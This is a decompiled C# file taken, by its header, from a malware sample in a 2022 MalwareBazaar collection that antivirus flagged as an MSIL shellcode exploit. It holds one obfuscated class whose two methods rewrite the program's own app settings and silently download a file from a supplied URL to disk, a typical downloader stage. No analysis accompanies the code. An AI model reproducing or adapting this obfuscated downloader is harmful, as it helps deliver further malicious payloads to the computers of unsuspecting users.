// Decompiled with JetBrains decompiler
// Type: 500852630662.564914878355
// Assembly: 903211523809, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 9299602E-5CAC-472E-8784-954A0E70F0DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-930e3513275891a4d2d1e51b0fb588f4b7f0b665bd972c7e0ccfececc5c3933e.exe

using \u003312744401414;
using System;
using System.Configuration;
using System.IO;
using System.Net;

namespace \u003500852630662
{
  public static class \u003564914878355
  {
    public static void \u003581937436263(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        throw new ArgumentNullException("key");
      System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
      configuration.AppSettings.Settings[_param0].Value = _param1;
      configuration.Save(ConfigurationSaveMode.Modified);
      ConfigurationManager.RefreshSection("appSettings");
    }

    public static void \u003824560203357(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        return;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.UserAgent = \u003232399463721.\u003663843689182;
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.KeepAlive = false;
      int totalMilliseconds = (int) TimeSpan.FromMinutes(10.0).TotalMilliseconds;
      httpWebRequest.Timeout = totalMilliseconds;
      httpWebRequest.ReadWriteTimeout = totalMilliseconds;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          if (responseStream == null)
            return;
          using (FileStream fileStream = new FileStream(_param1, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[8192];
            int length = buffer.Length;
            int count;
            while ((count = responseStream.Read(buffer, 0, length)) > 0)
            {
              fileStream.Write(buffer, 0, count);
              fileStream.Flush();
            }
          }
        }
      }
    }
  }
}
